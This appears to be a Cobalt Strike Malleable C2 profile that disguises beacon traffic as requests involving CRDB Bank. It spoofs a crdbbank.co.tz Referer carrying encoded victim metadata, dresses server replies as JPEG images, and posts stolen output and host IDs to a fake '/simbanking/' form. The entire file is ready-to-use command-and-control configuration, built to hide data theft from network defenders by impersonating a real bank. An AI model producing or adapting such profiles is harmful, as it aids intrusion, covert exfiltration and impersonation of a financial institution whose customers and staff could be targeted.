# Author: @AuxGrep
#
set sample_name "CRDB";

set sleeptime "5000";
set jitter    "0";
dns-beacon {
    
    set maxdns "255";
}
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/image/banking.jpg";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";

        metadata {
            base64url;
            prepend "https://crdbbank.co.tz/?_crdb=";
            header "Referer";
        }
        
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";
    }

    server {

        header "Content-Type" "img/jpeg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";

        output {
            prepend "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x01";
            print;
        }
    }
}

http-post {
    set uri "/simbanking/";

    client {

        header "Content-Type" "application/x-www-form-urlencoded";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        id {
            netbiosu;
            parameter "tz";
        }

        output {
            base64url;
            prepend "content=";
            append "&log=crdb_34&submit=Submit";
            print;
        }
    }

    server {

        header "Content-Type" "img/jpg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            print;
        }
    }
}

